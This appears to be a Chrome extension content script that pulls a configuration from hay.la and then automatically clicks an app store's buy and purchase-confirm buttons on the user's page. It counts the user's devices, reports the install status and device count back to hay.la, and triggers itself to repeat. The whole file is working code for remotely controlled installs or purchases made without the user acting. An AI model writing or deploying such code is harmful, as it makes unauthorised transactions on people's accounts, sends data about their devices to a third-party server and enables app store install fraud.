function UpdateInstallApp( NumberDevies,  StatusInstall, StatusCommentRating)
{
	var xmlhttp;

	if (window.XMLHttpRequest) {
		xmlhttp = new XMLHttpRequest();
	} else {
		xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	}

	xmlhttp.onreadystatechange = function () {
		if (xmlhttp.readyState == 4) {
			if (xmlhttp.status == 200) {

			}
			else if (xmlhttp.status == 400) {
			
			}
			else {
			
			}
		}
	}

	xmlhttp.open("GET", "https://hay.la/app/UpdateInstallApp?NumberDevies="+NumberDevies+"&StatusInstall="+StatusInstall+"&StatusCommentRating="+StatusCommentRating+"", true);
	xmlhttp.send();

}

var NumberDevies = 0;
var StatusInstall = 0;
var StatusCommentRating = 0;

try
{

var xmlhttp;

if (window.XMLHttpRequest) {
	xmlhttp = new XMLHttpRequest();
} else {
	xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
}

xmlhttp.onreadystatechange = function () {
	if (xmlhttp.readyState == 4) {
		if (xmlhttp.status == 200) {

			var objtime = JSON.parse(xmlhttp.responseText);
			
			try
			{
			document.getElementsByClassName('price buy')[0].click();
			
			setTimeout(function(){
			NumberDevies = document.getElementsByClassName('device-selector-dropdown-child').length;
			if(NumberDevies > 0 )
			{
				StatusInstall = 1;
			}
			document.getElementById('purchase-ok-button').click();}, objtime[0].sleepclickinstallapp * 1000);
			
			setTimeout(function(){
				chrome.extension.sendMessage({
						action: "sendagain"		
				});
			}, 3 * 1000);
			
			UpdateInstallApp(NumberDevies,StatusInstall,StatusCommentRating);
			}catch(ex)
			{
				UpdateInstallApp(NumberDevies,StatusInstall,StatusCommentRating);
				setTimeout(function(){
					chrome.extension.sendMessage({
							action: "sendagain"		
					});
				}, 3 * 1000);
			}

		}
		else if (xmlhttp.status == 400) {
		
		}
		else {
		
		}
	}
}

xmlhttp.open("GET", "https://hay.la/app/getConfig?version=1", true);
xmlhttp.send();

}catch(ex)
{
	UpdateInstallApp(NumberDevies,StatusInstall,StatusCommentRating);
	setTimeout(function(){
		chrome.extension.sendMessage({
				action: "sendagain"		
		});
	}, 3 * 1000);
}




